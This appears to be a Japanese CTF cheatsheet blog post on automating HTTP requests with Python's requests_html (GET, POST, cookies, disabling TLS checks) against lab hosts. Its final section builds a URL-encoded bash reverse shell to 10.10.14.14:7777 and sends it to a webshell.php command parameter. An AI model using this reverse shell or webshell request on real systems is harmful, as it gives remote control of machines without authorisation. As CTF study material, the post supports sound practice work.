---
layout: post
title: HTTP通信の自動化(python/requests_html)
published : true
tags: CTF Common cheatsheet python requests_html
---
## 基本
```python
from requests_html import HTMLSession

s = HTMLSession()
```

## GET
```python
url = 'http://10.10.11.116/'

r = s.get(url)

print(r.text) # htmlを表示
print(r.html.text) # inner textのみ表示
```

## POST
```python
url = 'http://10.10.11.116/'

data = {"username":"admin","password":"adm123"}
r = s.post(url, data=data)
```

## POST(JSON)
```python
url = 'http://10.10.11.116/'

data = {"username":"admin","password":"adm123"}
r = s.post(url, json=data)
```

## Cookie
### 取得

### 送信
```python
url = "http://10.10.11.139:5000/"

session.cookies.set('auth', 'some_cookie')

r = session.get(url)
```

## TLS証明書の検証をしない
verify=False
```python
url = 'https://store.nunchucks.htb/api/submit'
r = session.post(url, verify=False, json=data)
```

## DataのURL encode
```python
import urllib.parse

cmd = 'bash -c "bash -i >& /dev/tcp/10.10.14.14/7777 0>&1"'
cmd = urllib.parse.quote(cmd)
url = f'http://10.10.11.116/webshell.php?cmd={cmd}'

r = s.get(url)
```